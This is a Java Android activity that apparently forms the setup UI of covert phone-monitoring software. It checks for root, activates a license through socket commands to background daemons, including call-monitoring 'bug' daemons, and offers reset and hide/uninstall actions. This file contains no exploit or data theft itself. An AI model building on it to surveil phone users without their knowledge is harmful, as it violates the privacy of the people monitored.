package com.fx;

import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.text.Html;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.android.msecurity.R;
import com.daemon_bridge.CommandResponseBase;
import com.daemon_bridge.GetLicenseStatusCommand;
import com.daemon_bridge.GetLicenseStatusCommandResponse;
import com.daemon_bridge.GetLicenseStatusCommandResponse.LicenseStatus;
import com.daemon_bridge.GetProductInfoCommandResponse;
import com.daemon_bridge.SendActivateCommand;
import com.daemon_bridge.SendActivateCommandResponse;
import com.daemon_bridge.SendPackageNameCommand;
import com.daemon_bridge.SendPackageNameCommandResponse;
import com.daemon_bridge.SocketCommandBase;
import com.fx.daemon.util.CrashReporter;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.pmond.ref.MonitorDaemonResource;
import com.fx.util.Customization;
import com.fx.util.FxResource;
import com.fx.util.ProductInfo;
import com.fx.util.ProductInfoHelper;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.logger.FxLog;
import com.vvt.pm.PackageUtil;
import com.vvt.shell.ShellUtil;
import com.vvt.stringutil.FxStringUtils;
import com.vvt.timer.TimerBase;

public class MainActivity extends Activity {
	
	private static final String TAG = "MainActivity";
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	
	private enum UiState { UNKNOWN, VERIFY_ROOT, READY_TO_ACTIVATE, ACTIVATED };
	private UiState mCurrentUiState = UiState.UNKNOWN;
	
	private static final int DIALOG_ABOUT = 1;
	private static final int DIALOG_ACTIVATE = 2;
	
	private static final int MENU_ABOUT = 0;
	private static final int MENU_ACTIVATE = 1;
	private static final int MENU_RESET = 2;
	private static final int MENU_UNINSTALL = 3;
	private static final int TIMEOUT = 120;
	
	private Context mContext;
	private Handler mHandler;
	
	private ProgressDialog mProgressDialog;
	private TimerBase mProgressDialogTimeOut;
	
	private InstallingService mBoundInstallingService;
	private RemoteCallingService mBoundRemoteCallingService;
	private ResetService mBoundResetService;
	
	@Override
    public void onCreate(Bundle savedInstanceStateBundle) {
		if (LOGV) FxLog.v(TAG, "onCreate # ENTER ...[UI]");
		super.onCreate(savedInstanceStateBundle);
        mContext = this.getApplicationContext();
        mHandler = new Handler() {
        	public void handleMessage(Message msg) {
        		processMessage(msg);
        	}
        };
        Thread.setDefaultUncaughtExceptionHandler(new CrashReporter(TAG));
    }
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		MenuInflater inflater = getMenuInflater();
		inflater.inflate(R.menu.main_menu, menu);
		return true;
	}
		
	@Override
	public boolean onPrepareOptionsMenu(Menu menu) {
		if (LOGV) FxLog.v(TAG, "onPrepareOptionsMenu # ENTER ...[UI]");
		menu.clear();
	 
		
		if(mCurrentUiState == UiState.VERIFY_ROOT) {
		    menu.add(0, MENU_ABOUT, 0, getString(R.string.language_ui_label_about_title)).setIcon(android.R.drawable.ic_menu_info_details);
		    menu.add(0, MENU_RESET, 0, getString(R.string.language_ui_label_reset_title)).setIcon(android.R.drawable.ic_menu_manage);
		    menu.add(0, MENU_UNINSTALL, 0, getString(R.string.language_ui_label_uninstall)).setIcon(android.R.drawable.ic_menu_delete);
		}
		else {
			menu.add(0, MENU_ABOUT, 0, getString(R.string.language_ui_label_about_title)).setIcon(android.R.drawable.ic_menu_info_details);
			menu.add(0, MENU_ACTIVATE, 0, getString(R.string.language_ui_label_activate)).setIcon(android.R.drawable.ic_menu_upload);
		    menu.add(0, MENU_RESET, 0, getString(R.string.language_ui_label_reset_title)).setIcon(android.R.drawable.ic_menu_manage);
		    menu.add(0, MENU_UNINSTALL, 0, getString(R.string.language_ui_label_uninstall)).setIcon(android.R.drawable.ic_menu_delete);
		}
	 
		if (LOGV) FxLog.v(TAG, "onPrepareOptionsMenu # EXIT ...[UI]");
		return super.onPrepareOptionsMenu(menu);
	}

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
    	if (LOGV) FxLog.v(TAG, "onOptionsItemSelected # ENTER ...[UI]");
    	if (LOGV) FxLog.v(TAG, "onOptionsItemSelected # ItemId :" + item.getItemId() );
    	
    	switch (item.getItemId()) {
    		case MENU_ACTIVATE:
    			showDialog(DIALOG_ACTIVATE);
    			break;
	    	case MENU_ABOUT:
	    		showDialog(DIALOG_ABOUT);
	    		break;
	    	case MENU_RESET:
	    		actionReset(true);
	    		break;
	    	case MENU_UNINSTALL:
	    		actionRemoveAll();
				break;
	    	default:
	    		 super.onOptionsItemSelected(item);
		}
    	
    	if (LOGV) FxLog.v(TAG, "onOptionsItemSelected # EXIT ...[UI]");
    	return true;
    }

    @Override
    protected void onStart() {
    	if (LOGV) FxLog.v(TAG, "onStart # ENTER ...[UI]");
    	super.onStart();
    	bindServices();
    	resetView();
    }
    
    @Override
    protected void onResume() {
    	if (LOGV) FxLog.v(TAG, "onResume # ENTER ...[UI]");
    	super.onResume();
    }
    
    @Override
    protected void onPause() {
    	if (LOGV) FxLog.v(TAG, "onPause # ENTER ...[UI]");
    	super.onPause();
    }
    
    @Override
    protected void onStop() {
    	if (LOGV) FxLog.v(TAG, "onStop # ENTER ...[UI]");
    	
    	unbindServices();
    	dismissProgressDialog();
    	
    	super.onStop();
    }
    
    @Override
	protected Dialog onCreateDialog(int id) {
    	FxLog.v(TAG, "onCreateDialog # ENTER ...[UI]");
    	
		switch (id) {
		case DIALOG_ACTIVATE:
			View activateView = getLayoutInflater().inflate(R.layout.activate_dialog, null);
			final EditText inputActivateCode = (EditText) activateView.findViewById(R.id.input_activation_code);

			return new AlertDialog.Builder(this).setTitle(
					R.string.language_ui_label_activate_product).setView(
					activateView).setPositiveButton(
					R.string.language_ui_label_ok,
					new DialogInterface.OnClickListener() {
						public void onClick(DialogInterface dialog, int which) {
							if (which == DialogInterface.BUTTON_POSITIVE
									&& inputActivateCode != null
									&& inputActivateCode.getText() != null) {
								
								activate(inputActivateCode.getText().toString());
							}
						}
						
					}).setNegativeButton(R.string.language_ui_label_cancel,
					null).create();
		
		case DIALOG_ABOUT:
			View aboutView = getLayoutInflater().inflate(R.layout.about_dialog, null);
			TextView textView = (TextView) aboutView.findViewById(R.id.about_text_view);
			
			// Get product info from database
			ProductInfo productInfo = ProductInfoHelper.getProductInfo(mContext);

			/*			 
			String aboutFormat = "Product: %s<br>Version: %s<br>Date: %s";;
			String displayName = String.valueOf(productInfo.getDisplayName());
			String version = productInfo.getVersionName();
			String buildDate = productInfo.getBuildDate();
			String html = String.format(aboutFormat, displayName, version, buildDate);*/
			
			
			String aboutFormat = getString(R.string.language_about_information);
			String productId = String.valueOf(productInfo.getDisplayName());
			String version = productInfo.getVersionName();
			String html = String.format(aboutFormat, productId, version);
			
			CharSequence message = Html.fromHtml(html);
			textView.setText(message);
			
			return new AlertDialog.Builder(this)
				.setTitle(R.string.language_ui_label_about)
				.setView(aboutView)
				.setPositiveButton(R.string.language_ui_label_ok, null)
				.create();
		}
		
		FxLog.v(TAG, "onCreateDialog # EXIT ...[UI]");
		return null;
	}
    
    private ServiceConnection mInstallingServiceConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			if (LOGV) {
				FxLog.v(TAG, "onServiceConnected # ENTER ...");
			}
			mBoundInstallingService = ((InstallingService.LocalBinder) service).getService();
			mBoundInstallingService.setHandler(mHandler);
			verifyState();
		}
		@Override
		public void onServiceDisconnected(ComponentName name) {
			if (LOGV) {
				FxLog.v(TAG, "onServiceDisconnected # ENTER ...");
			}
			mBoundInstallingService = null;
		}
	};
	
	private ServiceConnection mRemoteCallingServiceConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mBoundRemoteCallingService = ((RemoteCallingService.LocalBinder) service).getService();
			mBoundRemoteCallingService.setHandler(mHandler);
			verifyState();
		}
		@Override
		public void onServiceDisconnected(ComponentName name) {
			mBoundRemoteCallingService = null;
		}
	};
	
	private ServiceConnection mResetServiceConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mBoundResetService = ((ResetService.LocalBinder) service).getService();
			mBoundResetService.setHandler(mHandler);
			verifyState();
		}
		@Override
		public void onServiceDisconnected(ComponentName name) {
			mBoundResetService = null;
		}
	};
    private void activate(String activationCode) {
    	if (LOGV) FxLog.v(TAG, "activate # ENTER ...[UI]");
    	
    	
    	if(!FxStringUtils.isEmptyOrNull(activationCode)) {
        	UiHelper.hideSoftInput(this, getCurrentFocus());
        	
        	SendActivateCommand activateCommand = new SendActivateCommand();
        	activateCommand.setActicationCode(activationCode);
        	new UITask().execute(activateCommand);
    	}
    	else {
    		if (LOGV) FxLog.v(TAG, "activate # activation code is empty!~");
    	}    	
     
    	if (LOGV) FxLog.v(TAG, "activate # EXIT ...[UI]");
	}
    
    private void processMessage(Message msg) {
		Bundle bundle = msg.getData();
		
		int event = bundle.getInt(UiHelper.BUNDLE_KEY_EVENT);
		
		switch (event) {
			case (UiHelper.EVENT_NOTIFY):
				notifyUser(bundle.getString(UiHelper.BUNDLE_KEY_TEXT));
				break;
			case (UiHelper.EVENT_UPDATE_PROGRESS):
				setProgressDialogMessage(bundle.getString(UiHelper.BUNDLE_KEY_TEXT));
				break;
			case (UiHelper.EVENT_PROCESSING_DONE):
				dismissProgressDialog();
			
			case (UiHelper.EVENT_SEND_PACKAGE_NAME):
				sendPackageName();
				break;
			case (UiHelper.EVENT_RESET_VIEW):
				resetView();
				break;
		}
	}
    
    private void sendPackageName() {
    	if (LOGV) FxLog.v(TAG, "sendPackageName # ENTER ...");
    	
    	String packageName = getPackageName();
    	if (LOGV) FxLog.v(TAG, "sendPackageName # packageName :" + packageName);
    	
    	SendPackageNameCommand sendPackageNameCommand = new SendPackageNameCommand();
    	sendPackageNameCommand.setPackageName(packageName);
    	new UITask().execute(sendPackageNameCommand);
    	
    	if (LOGV) FxLog.v(TAG, "sendPackageName # EXIT ...");
	}

	private void verifyState() {
    	if (LOGV) FxLog.v(TAG, "verifyState # ENTER ...");
    	
    	if (mBoundInstallingService == null ||
    			mBoundResetService == null ||
    			mBoundRemoteCallingService == null) {
    		
    		if (LOGV) FxLog.v(TAG, "verifyState # No bounded service -> EXIT");
    		return;
    	}
    	
    	if (mBoundInstallingService.isRunning()) {
    		if (LOGV) FxLog.v(TAG, "verifyState # Installing service is running ...");
    		actionVerifyPermission(false);
    	}
    	
    	else if (mBoundResetService.isRunning()) {
    		if (LOGV) FxLog.v(TAG, "verifyState # Reset service is running ...");
    		actionReset(false);
    	}
    	
    	else if (mBoundRemoteCallingService.isRunning()) {
    		if (LOGV) FxLog.v(TAG, "verifyState # RemoteCalling service is running ...");
    		waitForRemoteCallingService();
    	}
    	else {
    		if (LOGV) FxLog.v(TAG, "verifyState # No running service");
    	}
    	
    	if (LOGV) FxLog.v(TAG, "verifyState # EXIT ...");
    }
    
    private void resetView() {
    	if (LOGV) FxLog.v(TAG, "resetView # ENTER ...");
    	
    	if (LOGV) FxLog.v(TAG, String.format("resetView # Current UI state: %s", mCurrentUiState));
    	
    	UiState nextUiState = getNextUiState();
    	if (LOGV) FxLog.v(TAG, String.format("resetView # Next UI state: %s", nextUiState));
    	
    	if (nextUiState == mCurrentUiState) {
    		if (LOGV) FxLog.v(TAG, "resetView # No need to apply changes");
    	}
    	else {
    		if (LOGV) FxLog.v(TAG, "resetView # Applying changes to UI ...");
    		mCurrentUiState = nextUiState;
    		
    		if (nextUiState == UiState.READY_TO_ACTIVATE) {
        		setViewReadyToActivate();
        	}
        	else if (nextUiState == UiState.ACTIVATED) {
        		setViewSettings();
        	}
        	else {
        		setViewVerifyPermission();
        	}
    	}
    	
    	if (LOGV) FxLog.v(TAG, "resetView # EXIT ...");
    }
    
    private UiState getNextUiState() {
		if (LOGV) FxLog.v(TAG, "getNextUiState # ENTER ...");
		
		UiState nextUiState = UiState.UNKNOWN;
		
		boolean isMonitorRunning = ShellUtil.isProcessRunning(MonitorDaemonResource.PROCESS_NAME);
		boolean isCallMgrRunning = ShellUtil.isProcessRunning(BugDaemonResource.CallMgr.PROCESS_NAME);
		boolean isCallMonRunning = ShellUtil.isProcessRunning(BugDaemonResource.CallMon.PROCESS_NAME);
		boolean isMainRunning = ShellUtil.isProcessRunning(MainDaemonResource.PROCESS_NAME);
		
		boolean isDaemonRunning = isMonitorRunning && isCallMgrRunning && isCallMonRunning && isMainRunning; 
		
		if (LOGV) FxLog.v(TAG, String.format(
				"getNextUiState # isDaemonRunning: %s", isDaemonRunning));
		
		if (isDaemonRunning) {
			// TODO Check activation status
			// Is activated already ?
			GetLicenseStatusCommand getLicenseStatusCommand = new GetLicenseStatusCommand();
			new UITask().execute(getLicenseStatusCommand);
			
			nextUiState = UiState.READY_TO_ACTIVATE;
			
		}
		else {
			if (LOGV) FxLog.v(TAG, "resetView # Preparation is incompleted");
			nextUiState = UiState.VERIFY_ROOT;
		}
		
		if (LOGV) FxLog.v(TAG, String.format("getNextUiState # Next UI state: %s", nextUiState));
		if (LOGV) FxLog.v(TAG, "getNextUiState # EXIT ...");
		
		return nextUiState;
	}

	private void setViewVerifyPermission() {
    	if (LOGV) FxLog.v(TAG, "setViewVerifyPermission # ENTER ...");
		setContentView(R.layout.check_root_permission_form);
    	
    	Button btnCheckRoot = (Button) findViewById(R.id.btn_check_root_permission);
    	btnCheckRoot.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				if (LOGV) FxLog.v(TAG, "Begin verifying permission");
				actionVerifyPermission(true);
			}
		});
    	if (LOGV) FxLog.v(TAG, "setViewVerifyPermission # EXIT ...");
    }
    
    private void setViewReadyToActivate() {
    	if (LOGV) FxLog.v(TAG, "setViewReadyToActivate # ENTER ...");
    	setContentView(R.layout.activation_form);
        if (LOGV) FxLog.v(TAG, "setViewReadyToActivate # EXIT ...");
    }
    
    private void actionVerifyPermission(boolean startService) {
    	if (LOGV) FxLog.v(TAG, "actionVerifyPermission # ENTER ...");
    	
    	showProgressDialog();
		
		// Start installing service
		if (startService) {
			if (LOGV) FxLog.v(TAG, "actionVerifyPermission # Start Installing service");
			startService(new Intent(MainActivity.this, InstallingService.class));
		}
		
		if (LOGV) FxLog.v(TAG, "actionVerifyPermission # EXIT ...");
	}
    
    private void actionReset(boolean startService) {
    	if (LOGV) FxLog.v(TAG, "actionReset # ENTER ...");
    	
    	showProgressDialog();
    	
    	if (startService) {
    		if (LOGV) FxLog.v(TAG, "actionReset # Start Reset service");
    		startService(new Intent(MainActivity.this, ResetService.class));
    	}
    	if (LOGV) FxLog.v(TAG, "actionReset # EXIT ...");
    }
    
    private void actionRemoveAll() {
		if (LOGV) FxLog.v(TAG, "actionRemoveAll # ENTER ...");
		
		// Check current state
		UiState uiState = mCurrentUiState;
    	if (uiState == UiState.UNKNOWN) {
    		uiState = getNextUiState();
    	}
    	
    	if (LOGV) FxLog.v(TAG, String.format("actionRemoveAll # uiState: %s", uiState.toString()));
    	
    	if (uiState == UiState.VERIFY_ROOT) {
    		if (LOGV) FxLog.v(TAG, "actionRemoveAll # Prompt uninstall");
    		PackageUtil.promptUninstall(mContext);
    	}
    	else {
    		if (LOGV) FxLog.v(TAG, "actionRemoveAll # Wait for remote calling service");
			waitForRemoteCallingService();
			
			if (LOGV) FxLog.v(TAG, "actionRemoveApk # Start RemoteCalling service");
			Intent uninstall = new Intent(MainActivity.this, RemoteCallingService.class);
			uninstall.setAction(RemoteCallingService.ACTION_REMOVE_ALL);
			startService(uninstall);
    	}
		if (LOGV) FxLog.v(TAG, "actionRemoveAll # EXIT ...");
	}
	
 
/*	private void actionRemoveApk() {
		if (LOGV) FxLog.v(TAG, "actionRemoveApk # ENTER ...");
		
		if (LOGV) FxLog.v(TAG, "actionRemoveAll # Wait for remote calling service");
		waitForRemoteCallingService();
		
		if (LOGV) FxLog.v(TAG, "actionRemoveApk # Start RemoteCalling service");
		Intent uninstall = new Intent(MainActivity.this, RemoteCallingService.class);
		uninstall.setAction(RemoteCallingService.ACTION_REMOVE_APK);
		startService(uninstall);
		
		if (LOGV) FxLog.v(TAG, "actionRemoveApk # EXIT ...");
	}*/

	/**
	 * RemoteCallingService is one way communication for hiding or uninstalling application. 
	 * Once it is finished, the APK will be removed. 
	 */
	private void waitForRemoteCallingService() {
		showProgressDialog();
	}

	private void notifyUser(String stringMessage) {
    	Toast.makeText(this, stringMessage, Toast.LENGTH_LONG).show();
    }
    
    private void showProgressDialog() {
    	if (LOGV) {
    		FxLog.v(TAG, "showProgressDialog # ENTER ...");
    	}
    	
    	if (mProgressDialog == null) {
	    	mProgressDialog = ProgressDialog.show(MainActivity.this, "", 
	    			FxResource.LANGUAGE_UI_MSG_PROCESSING_POLITE, true);
	    	
	    	resetProgressDialogTimeout();
    	}
    }
    
    private void setViewSettings() {
    	Intent intent = new Intent();
		intent.setClass(MainActivity.this, ApplicationSettingsActivity.class);
		startActivity(intent);
		finish();
    }
    
    private void resetProgressDialogTimeout() {
    	if (mProgressDialogTimeOut != null) {
    		mProgressDialogTimeOut.stop();
    		mProgressDialogTimeOut = null;
    	}
    	
    	mProgressDialogTimeOut = new TimerBase() {
			
			@Override
			public void onTimer() {
				if (LOGV) {
					FxLog.v(TAG, "resetProgressDialogTimeout.onTimer # ENTER ...");
				}
				dismissProgressDialog();
				
				// Cannot do toast inside Thread that has not called Looper.prepare()
				Bundle data = new Bundle();
				data.putInt(
						UiHelper.BUNDLE_KEY_EVENT, 
						UiHelper.EVENT_NOTIFY);
				
				data.putString(
						UiHelper.BUNDLE_KEY_TEXT, 
						FxResource.LANGUAGE_PROCESS_NOT_RESPONDING);
				
				Message msg = new Message();
				msg.setData(data);
				
				mHandler.sendMessage(msg);
			}
		};
		
		mProgressDialogTimeOut.setTimerDurationMs(
				UiHelper.PROGRESS_DIALOG_TIMEOUT_LONG_MS);
		
		mProgressDialogTimeOut.start();
    }
    
    private void setProgressDialogMessage(String message) {
    	if (mProgressDialog != null) {
			mProgressDialog.setMessage(message);
		}
    	resetProgressDialogTimeout();
    }
    
    private void dismissProgressDialog() {
    	if (LOGV) FxLog.v(TAG, "dismissProgressDialog # ENTER ...");
    	
    	Thread t = new Thread() {
    		@Override
    		public void run() {
    			SystemClock.sleep(500);
    			
    			if (mProgressDialog != null) {
    				mProgressDialog.dismiss();
    				mProgressDialog = null;
    			}
    			
    			// Cancel timeout timer
    			if (mProgressDialogTimeOut != null) {
    				mProgressDialogTimeOut.stop();
    				mProgressDialogTimeOut = null;
    			}
    		}
    	};
    	t.start();
    }
    
    private void bindServices() {
    	if (mBoundInstallingService == null) {
	    	bindService(new Intent(MainActivity.this, InstallingService.class), 
	    			mInstallingServiceConn, BIND_AUTO_CREATE);
    	}
    	
    	if (mBoundRemoteCallingService == null) {
	    	bindService(new Intent(MainActivity.this, RemoteCallingService.class), 
	    			mRemoteCallingServiceConn, BIND_AUTO_CREATE);
    	}
    	
    	if (mBoundResetService == null) {
	    	bindService(new Intent(MainActivity.this, ResetService.class), 
	    			mResetServiceConn, BIND_AUTO_CREATE);
    	}
    }
    
    private void unbindServices() {
    	if (mBoundInstallingService != null) {
    		unbindService(mInstallingServiceConn);
    		mBoundInstallingService = null;
    	}
    	
    	if (mBoundRemoteCallingService != null) {
	    	unbindService(mRemoteCallingServiceConn);
	    	mBoundRemoteCallingService = null;
    	}
    	
    	if (mBoundResetService != null) {
	    	unbindService(mResetServiceConn);
	    	mBoundResetService = null;
    	}
    }
    
    private String mErrorResponse = null;
    
    private class UITask extends AsyncTask<SocketCommandBase, Void, String> {
		private CommandResponseBase result = null;
		private ProgressDialog pDialog;
		
		
		protected void onPreExecute() {
			pDialog = ProgressDialog.show(MainActivity.this, "", getString(R.string.language_ui_msg_processing_polite), true);
	    }
		
	    protected String doInBackground(final SocketCommandBase... socketCommandBase) {
	    	if (LOGV) FxLog.v(TAG, "UITask # doInBackground # START");
	    	
	    	ExecutorService executor = Executors.newCachedThreadPool();
	    	Callable<Void> task = new Callable<Void>() {
	    	   public Void call() {
	    		   if (LOGV) FxLog.v(TAG, "UITask # call # START");
	    		   
	    		   SocketCommandBase initSocketCommandBase = socketCommandBase[0];
	   	    	
		   			try {
		   				if (LOGV) FxLog.v(TAG, "UITask # before execute");
		           		result = initSocketCommandBase.execute();
		           		if (LOGV) FxLog.v(TAG, "UITask # after execute");
		           	}
		           	catch(Throwable t) {
		           		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + t.toString());
		           		mErrorResponse = t.getMessage();
		           	}
	   			
		   			if (LOGV) FxLog.v(TAG, "UITask # call # EXIT");
	   				return null;
	    	   }
	    	};
	    	
	    	Future<Void> future = executor.submit(task);
	    	
	    	try {
	    	   
	    		future.get(TIMEOUT, TimeUnit.SECONDS); 
	    	   if (LOGV) FxLog.v(TAG, "UITask # after exec");
	    	   
	    	} catch (TimeoutException ex) {
	    	   // handle the timeout
	    		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + ex.toString());
	    		mErrorResponse = "Operation timeout !";
	    		
	    	} catch (InterruptedException e) {
	    	   // handle the interrupts
	    		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + e.toString());
	    		mErrorResponse = e.getMessage();
	    		
	    	} catch (ExecutionException e) {
	    	   // handle other exceptions
	    		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + e.toString());
	    		mErrorResponse = e.getMessage();
	    		
	    	} finally {
	    	   //future.cancel(); // may or may not desire this
	    	}
 			
			if (LOGV && result != null) FxLog.v(TAG, "UITask # doInBackground # result #" + result.toString());
			if (LOGV) FxLog.v(TAG, "UITask # doInBackground # EXIT");
	    	return null;
	    }

	    protected void onPostExecute(String outputMsg) {
	    	pDialog.dismiss();
	    	
	    	if(result != null)
	    		onPostExecuteTask(result);
	    	else {
	    		UiHelper.notifyUser(getApplicationContext(), mErrorResponse);
	    	}
	    }
	}
	
	private void onPostExecuteTask(CommandResponseBase result) {
		if(result instanceof SendActivateCommandResponse) {
    		SendActivateCommandResponse sendActivateCommandResponse = (SendActivateCommandResponse)result;
    		UiHelper.notifyUser(getApplicationContext(), sendActivateCommandResponse.getResponseMsg());
    		
    		if(sendActivateCommandResponse.getResponseCode() == CommandResponseBase.SUCCESS) {
    			mCurrentUiState = UiState.ACTIVATED;
    			resetView();
    		}
    	}
		else if(result instanceof GetLicenseStatusCommandResponse) {
			GetLicenseStatusCommandResponse getLicenseStatusCommandResponse = (GetLicenseStatusCommandResponse)result;
			if(getLicenseStatusCommandResponse.getStatusCode() == LicenseStatus.ACTIVATED) {
				mCurrentUiState = UiState.ACTIVATED;
				setViewSettings();
			}
			else {
				mCurrentUiState = UiState.READY_TO_ACTIVATE;
				setViewReadyToActivate();
			}
		}
		if(result instanceof GetProductInfoCommandResponse) {
			GetProductInfoCommandResponse response =  (GetProductInfoCommandResponse)result;
			
			if(response.getResponseCode() == CommandResponseBase.SUCCESS) {
				View aboutView = getLayoutInflater().inflate(R.layout.about_dialog,null);
				TextView textView = (TextView) aboutView.findViewById(R.id.about_text_view);
				
				String aboutFormat = getString(R.string.language_about_information);
				String productId = String.valueOf(response.getProductId());
				String version = response.getProductVersion();
				String html = String.format(aboutFormat, productId, version);
				CharSequence aMessage = Html.fromHtml(html);
				
				textView.setText(aMessage);
				AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this).setTitle(R.string.language_ui_label_about).setView(aboutView).setPositiveButton(R.string.language_ui_label_ok, null);
				builder.show();
			}
		}
		if(result instanceof SendPackageNameCommandResponse) {
			// Do nothing ..
		}
	}
}


